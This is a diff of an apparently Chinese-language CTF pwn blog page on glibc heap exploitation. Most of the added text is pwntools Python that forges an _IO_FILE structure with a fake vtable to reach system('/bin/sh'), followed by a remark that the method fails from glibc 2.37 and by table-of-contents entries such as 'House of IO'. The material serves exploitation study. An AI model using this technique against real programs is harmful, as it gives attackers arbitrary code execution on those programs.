+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">memcpy_buf_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_buf_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_buf_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_save_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_backup_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">memcpy_got_addr</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_save_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">memcpy_got_addr</span> <span class="o">+</span> <span class="mi">21</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_marks</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">the</span> <span class="n">FILE</span> <span class="n">chain</span> <span class="n">ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFF0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_fileno</span> <span class="o">+</span> <span class="n">_flags2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_old_offset</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">b</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span>  <span class="err">#</span> <span class="n">_vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">b</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span>  <span class="err">#</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_2_1_stdout_</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_offset</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_codecvt</span><span class="p">,</span> <span class="n">usually</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">wide_data_addr</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_wide_data_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_freeres_list</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_freeres_buf</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_2_1_stdout_</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">__pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_mode</span><span class="p">,</span> <span class="n">usually</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">b</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="err">#</span> <span class="n">_unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">b</span><span class="sc">&#39;\x00&#39;</span><span class="p">)</span>  <span class="err">#</span> <span class="n">adjust</span> <span class="n">to</span> <span class="n">vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_helper_jumps</span><span class="err">&#39;</span><span class="p">])</span>  <span class="err">#</span> <span class="n">fake</span> <span class="n">vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">memcpy_buf_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">memcpy_buf_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mi">21</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">_IO_str_jumps</span><span class="err">&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">\</span><span class="n">x00</span><span class="err">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>glibc-2.37 开始删除了 <code>_IO_helper_jumps</code> ，方法失效</p>
 <h2 id="条件竞争">条件竞争</h2>
 <h3 id="double-fetch">Double Fetch</h3>
 <p><strong>漏洞点</strong></p>
@@ -15054,7 +16449,9 @@
         
             
         
-        共 204.22k 字 · 共 21篇文章
+            
+        
+        共 219.82k 字 · 共 22篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -15404,6 +16801,7 @@
             <li><a href="#fastbin-reverse">Fastbin Reverse</a></li>
             <li><a href="#tcache-stash-unlink">Tcache Stash Unlink</a></li>
             <li><a href="#safe-linking-bypass">Safe-linking Bypass</a></li>
+            <li><a href="#mp_-attack">mp_ attack</a></li>
           </ol>
         </li>
         <li><a href="#large-bin-attack">Large bin attack</a>
@@ -15423,6 +16821,7 @@
           <ol>
             <li><a href="#house-of-kauri">House of kauri</a></li>
             <li><a href="#house-of-botcake">House of Botcake</a></li>
+            <li><a href="#house-of-io">House of IO</a></li>
             <li><a href="#house-of-spirit">House of Spirit</a></li>
             <li><a href="#house-of-roman">House of Roman</a></li>
             <li><a href="#house-of-einherjar">House Of Einherjar</a></li>
